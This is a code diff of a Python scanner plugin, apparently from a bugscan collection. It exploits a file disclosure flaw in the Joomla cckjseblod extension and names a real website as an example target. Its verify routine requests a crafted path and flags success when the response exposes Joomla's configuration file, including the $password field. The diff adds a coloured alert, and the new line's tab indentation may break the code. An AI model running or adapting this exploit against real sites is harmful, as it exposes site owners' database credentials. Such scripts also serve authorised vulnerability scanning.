@@ -1,16 +1,18 @@
-from ..miniCurl import Curl
-from ..t  import T
 #!/usr/bin/python
 #-*- encoding:utf-8 -*-
+
 # Joomla cckjseblod exploit LFD
 #eg:http://www.starmarketingonline.com/index.php
 #https://www.bugscan.net/#!/x/22903
 
+from ..miniCurl import Curl
+from ..t  import T
+from termcolor import cprint
 
 class P(T):
     def __init__(self):
         T.__init__(self)
-    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
+    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
         arg='http://'+ip+':'+port+'/'
         curl=Curl()
         result = {}
@@ -20,9 +22,8 @@ class P(T):
         url = arg + payload
         code, head,res, errcode, _ = curl.curl2(url)
         if code == 200 and 'class JConfig {' in res and '$log_path' in res and '$password' in res:
+	    cprint(url + '存在joomla Vul漏洞', 'yellow')
             output(url,result,'warning')
-    
-
         del curl
         return result
 
